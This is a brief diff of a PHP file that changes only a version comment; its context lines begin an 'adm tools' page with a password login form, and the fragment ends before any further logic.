@@ -1,5 +1,5 @@
 <?php
-// v.10.a.1::about revision
+// v.10.a.1::adm revision
 echo "<html><head><title>adm tools</title></head><body>";
 if ((!ISSET($_POST['log'])) || (!ISSET($_POST['dep'])) || (ISSET($_POST['relog']))) {
 	$str1='<h3>adm tools</h3><form action="" target=_self method=post><input type=text value=0 name="dep"> : <input type=text value="Input password" name="log">';
